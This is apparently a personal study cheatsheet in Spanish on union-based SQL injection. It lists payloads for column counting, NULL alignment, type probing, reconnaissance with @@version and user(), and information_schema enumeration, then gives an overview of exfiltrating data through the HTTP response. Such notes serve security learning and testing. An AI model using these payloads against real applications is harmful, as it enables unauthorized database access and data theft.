---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLi  - Union based

***

## Cheatsheet

|   **Fase de Explotación**   |                           **Payload Estructural**                            |                                                               **Notas de Ejecución**                                                                |
|:---------------------------:|:----------------------------------------------------------------------------:|:---------------------------------------------------------------------------------------------------------------------------------------------------:|
|  <br>Detección de columnas  |                     <br>`ORDER BY 1--`<br>`ORDER BY 2--`                     |             <br>Incremento el índice posicional hasta generar un error. El último número válido es el total exacto de columnas.<br><br>             |
|  <br>Alineación con Nulos   |                    <br>`UNION SELECT NULL, NULL, NULL--`                     | <br>Confirmo la cantidad de columnas. Uso `NULL` porque es compatible con la mayoría de los tipos de datos, evitando excepciones de casteo.<br><br> |
| <br>Identificación de Tipos |                     <br>`UNION SELECT 'a', NULL, NULL--`                     |           <br>Reemplazo iterativamente los nulos por cadenas de texto para descubrir qué columna refleja strings en el frontend.<br><br>            |
|     <br>Reconocimiento      |              <br>`UNION SELECT @@version, user(), database()--`              |                                    <br>Extracción inicial de metadatos del SGBD y contexto de ejecución.<br><br>                                    |
| <br>Enumeración de Esquema  | <br>`UNION SELECT table_name, NULL FROM information_schema.tables--`<br><br> |                               <br>Volcado de las estructuras internas para planificar extracciones dirigidas.<br><br>                               |
^sqli-union

___

## Overview

El [[Union-based SQLi]] es un vector de ataque In-Band que aprovecha el operador `UNION` del lenguaje SQL para anexar un conjunto de resultados arbitrarios al conjunto de resultados de la consulta original elaborada por la aplicación. A diferencia del [[Error-based SQLi]] o las variantes inferenciales, esta técnica me permite recuperar grandes volúmenes de datos de forma directa y limpia dentro de la respuesta HTTP, convirtiéndola en el método de exfiltración más eficiente cuando el escenario lo permite.

Para que la inyección sea exitosa, la estructura de la consulta subyacente impone dos reglas matemáticas y lógicas que debo resolver antes de intentar cualquier exfiltración de datos.


***
